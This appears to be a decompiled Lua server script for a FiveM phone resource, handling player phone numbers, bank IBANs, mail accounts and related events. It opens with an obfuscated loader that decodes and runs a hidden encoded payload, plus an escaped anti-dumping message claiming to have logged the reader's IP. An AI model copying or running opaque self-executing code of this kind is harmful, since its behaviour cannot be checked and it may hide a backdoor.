5\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if vjM4do7sHDJH81Cxz2GDcvYmfNGlDRv7Rsne2RaiOPQzfZGTUU1eVA5Srxr[vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('4D') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('8E') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('B4') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('F5')](t) then
                    vjM4do7sHDJH81Cxz2GDcvYmfNGlDRv7Rsne2RaiOPQzfZGTUU1eVA5Srxr
                        [vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('4D') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('8E') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('B4') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('F5')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; tSgMwGNdZzC5zYzZtbQIK4iMdEzK6WxYCJRe4LBVD2QgwTkpMLpjb8554nhbCrSl(
{ 952, 569, 618, 835, 1149, 1167, 661, 924, 1114, 1056, 803, 589, 1199, 544, 873, 1072, 1068, 1044, 612, 1015, 729, 627,
  757, 981, 727, 898, 1143, 768, 897, 1030, 1118, 760, 1150, 1169, 557, 1100, 1198, 1158, 847, 883, 1069, 1112, 1071,
  671, 1138, 870, 686, 697, 548, 888, 1173, 636, 980, 949, 1076, 584, 970, 945, 1008, 658, 1155, 747, 710, 682, 975, 788,
  831, 1137, 1212, 744, 1147, 1136, 769, 570, 861, 647, 865, 1018, 777, 986, 560, 825, 603, 1082, 781, 989, 1034, 550,
  800, 745, 600, 1202, 886, 738, 983, 561, 789, 640, 635, 907, 1037, 1017, 1131, 942, 875, 577, 878, 673, 753, 934, 941,
  1206, 895, 916, 1048, 903, 1026, 702, 918, 633, 1168, 877, 549, 1090, 672, 1157, 1038, 648, 1079, 666, 667, 590, 634,
  611, 1190, 566, 690, 972, 731, 935, 1121, 679, 606, 1036, 1055, 1133, 750, 725, 867, 830, 859, 921, 1033, 936, 933,
  1144, 1095, 1156, 764, 786, 976, 1019, 583, 801, 915, 678, 819, 771, 546, 670, 1060, 1124, 826, 1128, 723, 790, 836,
  761, 1047, 1099, 857, 1010, 592, 1184, 882, 794, 1110, 823, 694, 675, 1175, 893, 1012, 1084, 904, 734, 1001, 669, 718,
  763, 704, 959, 1159, 615, 643, 1078, 1113, 1181, 818, 715, 1092, 1152, 1005, 923, 685, 591, 957, 1086, 846, 653, 656,
  688, 617, 646, 956, 608, 948, 593, 638, 848, 799, 677, 1101, 938, 1141, 1059, 909, 832, 755, 1022, 739, 681, 1187,
  1105, 968, 565, 651, 905, 879, 1062, 987, 553, 1043, 1094, 741, 639, 1031, 1073, 1057, 1127, 1011, 808, 782, 609, 811,
  649, 911, 629, 828, 854, 855, 1096, 880, 1153, 559, 1191, 999, 772, 574, 616, 960, 689, 1179, 862, 792, 953, 967, 1014,
  767, 820, 928, 824, 1013, 850, 587, 626, 779, 676, 735, 829, 582, 743, 776, 996, 866, 805, 838, 962, 806, 740, 988,
  1085, 810, 1083, 817, 547, 874, 585, 839, 1091, 599, 1035, 610, 751, 655, 1089, 900, 1045, 997, 1208, 885, 1041, 809,
  1129, 939, 775, 958, 1177, 1049, 833, 579, 746, 1148, 815, 1160, 631, 1003, 630, 1123, 564, 1201, 1164, 1197, 984, 966,
  1077, 1104, 1200, 1161, 1180, 1009, 1211, 1046, 1193, 737, 581, 821, 770, 1016, 749, 568, 663, 598, 1028, 851, 674,
  1209, 624, 990, 1166, 1186, 622, 843, 1029, 784, 578, 977, 687, 1020, 901, 1207, 925, 971, 920, 1065, 837, 944, 926,
  929, 597, 698, 844, 842, 864, 791, 849, 796, 1000, 978, 1075, 1163, 1021, 1108, 1111, 602, 632, 917, 992, 619, 545,
  711, 1192, 607, 695, 1040, 1088, 910, 906, 601, 802, 736, 595, 868, 793, 994, 1002, 932, 1004, 890, 652, 912, 908, 625,
  1032, 1027, 1119, 1135, 946, 567, 709, 580, 758, 657, 872, 995, 919, 1070, 703, 982, 662, 668, 692, 1052, 716, 1051,
  889, 963, 891, 899, 1025, 852, 1189, 1140, 814, 834, 1132, 594, 896, 572, 713, 881, 822, 621, 722, 742, 691, 884, 1154,
  554, 1053, 863, 1203, 605, 1006, 1194, 637, 748, 955, 759, 871, 974, 1183, 1120, 552, 827, 1142, 714, 650, 1050, 726,
  797, 705, 724, 1058, 937, 604, 845, 720, 543, 642, 614, 752, 1116, 785, 1093, 1182, 1195, 712, 645, 707, 1042, 683,
  780, 856, 1170, 876, 902, 1064, 696, 954, 1109, 1196, -1, 114, 82, 120, 78, 61, 2, 122, 58, 119, 105, 126, 119, 53, 25,
  86, 203, 51, 49, 125, 186, 160, 62, 92, 30, 11, 69, 8, 122, 107, 73, 72, 55, 205, 157, 63, 42, 63, 17, 61, 48, 84, 59,
  1, 135, 88, 21, 68, 62, 23, 83, 14, 86, 10, 25, 44, 86, 30, 5, 73, 88, 29, 33, 88, 73, 66, 113, 63, 8, 42, 114, 238,
  84, 98, 24, 118, 46, 107, 9, 118, 113, 16, 23, 90, 103, 35, 192, 93, 44, 68, 10, 17, 36, 39, 23, 120, 37, 32, 76, 15,
  78, 65, 181, 81, 69, 21, 87, 22, 23, 29, 93, 80, 181, 12, 6, 10, 91, 144, 13, 16, 37, 58, 100, 17, 100, 126, 38, 66,
  27, 50, 126, 62, 20, 8, 66, 75, 110, 90, 158, 85, 20, 96, 23, 80, 112, 25, 61, 34, 78, 63, 14, 241, 81, 16, 88, 41, 17,
  246, 68, 21, 94, 9, 99, 53, 31, 14, 159, 94, 14, 83, 16, 20, 73, 127, 127, 110, 31, 229, 16, 111, 69, 117, 122, 34, 10,
  27, 118, 119, 169, 0, 123, 166, 4, 69, 53, 16, 77, 23, 92, 59, 86, 16, 50, 88, 61, 39, 46, 82, 65, 80, 120, 83, 151,
  22, 207, 24, 103, 23, 7, 118, 190, 118, 108, 14, 45, 116, 55, 50, 101, 0, 61, 140, 10, 25, 93, 4, 7, 73, 78, 66, 37,
  160, 49, 61, 116, 244, 95, 114, 71, 59, 86, 52, 127, 95, 71, 82, 247, 2, 12, 23, 23, 29, 45, 2, 69, 16, 49, 119, 88,
  93, 201, 251, 85, 1, 89, 63, 76, 90, 49, 107, 23, 82, 72, 120, 10, 73, 89, 23, 16, 63, 10, 120, 66, 42, 112, 28, 56,
  78, 69, 222, 83, 114, 64, 8, 73, 99, 35, 4, 16, 73, 98, 50, 58, 12, 27, 95, 27, 112, 75, 74, 77, 77, 80, 88, 38, 122,
  87, 119, 67, 127, 92, 39, 11, 84, 66, 108, 34, 38, 28, 73, 114, 23, 54, 114, 107, 173, 85, 64, 2, 11, 16, 110, 194, 19,
  105, 37, 26, 92, 37, 11, 20, 87, 91, 67, 20, 41, 78, 59, 73, 13, 29, 25, 217, 90, 105, 27, 38, 69, 42, 116, 12, 68, 93,
  44, 16, 138, 23, 2, 248, 21, 119, 84, 19, 105, 30, 56, 38, 77, 145, 16, 1, 121, 12, 20, 7, 132, 2, 45, 176, 158, 126,
  30, 14, 54, 19, 11, 88, 83, 120, 99, 43, 12, 11, 114, 19, 28, 75, 208, 1, 46, 16, 108, 66, 29, 84, 31, 58, 247, 84, 87,
  86, 20, 69, 231, 52, 28, 10, 66, 118, 249, 82, 202, 114, 8, 50, 57, 27, 90, 50, 110, 86, 30, 38, 64, 78, 73, 1, 77, 66,
  6, 69, 64, 40, 86, 83, 25, 73, 64, 20, 107, 4, 242, 121, 113, 27, 107, 105, 75, 112, 30, 118, 89, 19, 44, 71, 23, 8, 3,
  86, 75, 44, 52, 34, 76, 27, 85, 26, 18, 58, 15, 37, 101, 45, 55, 61, 27, 8, 44, 113, 89, 95, 83, 120, 83, 234, 220, 86,
  118, 126, 19, 16, 92, 71, 67, 107, 113, 30, 28, 229, 24, 26, 120, 19, 28, 96, 136, 105, 69, 76, 16, 103, 29, 2, 70, 87,
  132, 145, 8, 42, 21, 205, 176, 114, 97, 226, 6, 79, 57, 95, 16, 69, 74, 62, 137, 107, 115, 6, 43, 86, 0, 196, 7, 84,
  82, 209, 27, 99, 101, 218, 22, 16, 12, 146, 7, 15, 22, 48, 187, 83, 0, 20, 29, 73, 127, 75, 61, 11, 21, 14, 134, 127,
  69, 97, 31, 109, 79, 29, 101, 66, 119, 144, 117, 23, 60, 69, 26, 19, 28, 118, 25, 113, 88, 124, 67, 7, 7, 197, 8, 101,
  93, 17, 16, 106, 12, 19, 5, 110, 82, 83, 3, 85, 1, 84, 78, 33, 118, 11, 59, 75, 73, 23, 25, 222, 176, 85, 0, 113, 73,
  77, 25, 19 }, "tXKXsub0vIi4i7Ve3QRkWEm9xn");
function L0_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  L1_2 = nil
  L2_2 = Config
  L2_2 = L2_2.PhoneNumberColumn
  L3_2 = Config
  L3_2 = L3_2.BankNumberColumn
  L4_2 = type
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  if "table" ~= L4_2 then
    L4_2 = Config
    L4_2 = L4_2.FrameworkFunctions
    L4_2 = L4_2.getPlayer
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L1_2 = L4_2
  else
    L4_2 = Config
    L4_2 = L4_2.FrameworkFunctions
    L4_2 = L4_2.getPlayer
    L5_2 = A0_2.source
    if L5_2 then
      L5_2 = A0_2.source
      if L5_2 then
        goto lbl_35
      end
    end
    L5_2 = A0_2.PlayerData
    if L5_2 then
      L5_2 = A0_2.PlayerData
      L5_2 = L5_2.source
      if L5_2 then
        goto lbl_35
      end
    end
    L5_2 = nil
    ::lbl_35::
    L4_2 = L4_2(L5_2)
    L1_2 = L4_2
  end
  L4_2 = table
  L4_2 = L4_2.unpack
  L5_2 = getPlayerData
  L6_2 = L1_2.source
  L7_2 = {}
  L8_2 = L2_2
  L9_2 = L3_2
  L10_2 = "mailaccount"
  L7_2[1] = L8_2
  L7_2[2] = L9_2
  L7_2[3] = L10_2
  L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2 = L5_2(L6_2, L7_2)
  L4_2, L5_2, L6_2 = L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2)
  L7_2 = getTwitterUser
  L8_2 = L1_2.identifier
  L7_2 = L7_2(L8_2)
  if not L4_2 then
    L8_2 = getRandomNumber
    L9_2 = L1_2.source
    L8_2 = L8_2(L9_2)
    L4_2 = L8_2
    L9_2 = MySQL
    L9_2 = L9_2.Sync
    L9_2 = L9_2.execute
    L10_2 = "UPDATE "
    L11_2 = Config
    L11_2 = L11_2.PlayersTable
    L12_2 = " SET "
    L13_2 = L2_2
    L14_2 = " = @phone WHERE "
    L15_2 = Config
    L15_2 = L15_2.IdentifierColumn
    L16_2 = " = @identifier"
    L10_2 = L10_2 .. L11_2 .. L12_2 .. L13_2 .. L14_2 .. L15_2 .. L16_2
    L11_2 = {}
    L11_2["@phone"] = L8_2
    L12_2 = L1_2.identifier
    L11_2["@identifier"] = L12_2
    L9_2(L10_2, L11_2)
  end
  L8_2 = Config
  L8_2 = L8_2.EnableBankNumbersGeneration
  if L8_2 and not L5_2 then
    L8_2 = getRandomIBAN
    L9_2 = L1_2.source
    L8_2 = L8_2(L9_2)
    L5_2 = L8_2
    L9_2 = MySQL
    L9_2 = L9_2.Sync
    L9_2 = L9_2.execute
    L10_2 = "UPDATE "
    L11_2 = Config
    L11_2 = L11_2.PlayersTable
    L12_2 = " SET "
    L13_2 = L3_2
    L14_2 = " = @iban WHERE "
    L15_2 = Config
    L15_2 = L15_2.IdentifierColumn
    L16_2 = " = @identifier"
    L10_2 = L10_2 .. L11_2 .. L12_2 .. L13_2 .. L14_2 .. L15_2 .. L16_2
    L11_2 = {}
    L11_2["@iban"] = L8_2
    L12_2 = L1_2.identifier
    L11_2["@identifier"] = L12_2
    L9_2(L10_2, L11_2)
  end
  L8_2 = {}
  if L6_2 then
    L9_2 = MySQL
    L9_2 = L9_2.Sync
    L9_2 = L9_2.fetchAll
    L10_2 = "SELECT name, photo FROM phone_mailaccounts WHERE address = @address LIMIT 1"
    L11_2 = {}
    L11_2["@address"] = L6_2
    L9_2 = L9_2(L10_2, L11_2)
    if L9_2 then
      L10_2 = {}
      L10_2.address = L6_2
      L11_2 = L9_2[1]
      L11_2 = L11_2.photo
      L10_2.photo = L11_2
      L11_2 = L9_2[1]
      L11_2 = L11_2.name
      L10_2.name = L11_2
      L8_2 = L10_2
    end
  end
  L9_2 = TriggerClientEvent
  L10_2 = "high_phone:updateData"
  L11_2 = L1_2.source
  L9_2(L10_2, L11_2)
  L9_2 = Players
  L10_2 = L1_2.source
  L11_2 = {}
  L12_2 = L1_2.source
  L11_2.source = L12_2
  L12_2 = Config
  L12_2 = L12_2.IdentifierColumn
  L13_2 = L1_2.identifier
  L11_2[L12_2] = L13_2
  L11_2.airplane = false
  L11_2.number = L4_2
  L11_2.iban = L5_2
  L11_2.twitterAccount = L7_2
  L11_2.mailData = L8_2
  L9_2[L10_2] = L11_2
end

loadPlayer = L0_1
L0_1 = RegisterCommand
L1_1 = "fixphone"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  if 0 == A0_2 then
    L2_2 = pairs
    L3_2 = GetPlayers
    L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2 = L3_2()
    L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2)
    for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
      L8_2 = loadPlayer
      L9_2 = L7_2
      L8_2(L9_2)
    end
    return
  end
  L2_2 = loadPlayer
  L3_2 = A0_2
  L2_2(L3_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = Config
L1_1 = L1_1.Events
L1_1 = L1_1.playerLoaded
function L2_1(A0_2)
  local L1_2, L2_2
  L1_2 = loadPlayer
  L2_2 = A0_2
  L1_2(L2_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = Config
L1_1 = L1_1.Events
L1_1 = L1_1.playerDropped
function L2_1(A0_2)
  local L1_2
  L1_2 = Players
  L1_2[A0_2] = nil
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = Config
L1_1 = L1_1.Events
L1_1 = L1_1.updateJob
function L2_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L1_2 = Config
  L1_2 = L1_2.FrameworkFunctions
  L1_2 = L1_2.getPlayer
  L2_2 = source
  L1_2 = L1_2(L2_2)
  if L1_2 then
    L2_2 = TriggerClientEvent
    L3_2 = "high_phone:updateJob"
    L4_2 = A0_2
    L5_2 = json
    L5_2 = L5_2.encode
    L6_2 = {}
    L7_2 = L1_2.jobName
    L6_2.name = L7_2
    L7_2 = L1_2.jobGrade
    L6_2.grade = L7_2
    L5_2, L6_2, L7_2 = L5_2(L6_2)
    L2_2(L3_2, L4_2, L5_2, L6_2, L7_2)
  end
end

L0_1(L1_1, L2_1)
L0_1 = exports
L1_1 = "getPlayerPhoneNumber"
function L2_1(A0_2)
  local L1_2
  L1_2 = Players
  L1_2 = L1_2[A0_2]
  if L1_2 then
    L1_2 = Players
    L1_2 = L1_2[A0_2]
    L1_2 = L1_2.number
    if L1_2 then
      goto lbl_11
    end
  end
  L1_2 = nil
  ::lbl_11::
  return L1_2
end

L0_1(L1_1, L2_1)
L0_1 = exports
L1_1 = "getPlayerBankNumber"
function L2_1(A0_2)
  local L1_2
  L1_2 = Players
  L1_2 = L1_2[A0_2]
  if L1_2 then
    L1_2 = Players
    L1_2 = L1_2[A0_2]
    L1_2 = L1_2.iban
    if L1_2 then
      goto lbl_11
    end
  end
  L1_2 = nil
  ::lbl_11::
  return L1_2
end

L0_1(L1_1, L2_1)
L0_1 = exports
L1_1 = "getPlayerMailAddress"
function L2_1(A0_2)
  local L1_2
  L1_2 = Players
  L1_2 = L1_2[A0_2]
  if L1_2 then
    L1_2 = Players
    L1_2 = L1_2[A0_2]
    L1_2 = L1_2.mailData
    L1_2 = L1_2.address
    if L1_2 then
      goto lbl_12
    end
  end
  L1_2 = nil
  ::lbl_12::
  return L1_2
end

L0_1(L1_1, L2_1)
L0_1 = AddEventHandler
L1_1 = "onResourceStart"
function L2_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = GetCurrentResourceName
  L1_2 = L1_2()
  if A0_2 == L1_2 then
    L1_2 = Wait
    L2_2 = 1000
    L1_2(L2_2)
    L1_2 = pairs
    L2_2 = GetPlayers
    L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2 = L2_2()
    L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2)
    for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
      L7_2 = loadPlayer
      L8_2 = tonumber
      L9_2 = L6_2
      L8_2, L9_2 = L8_2(L9_2)
      L7_2(L8_2, L9_2)
    end
  end
end

L0_1(L1_1, L2_1)
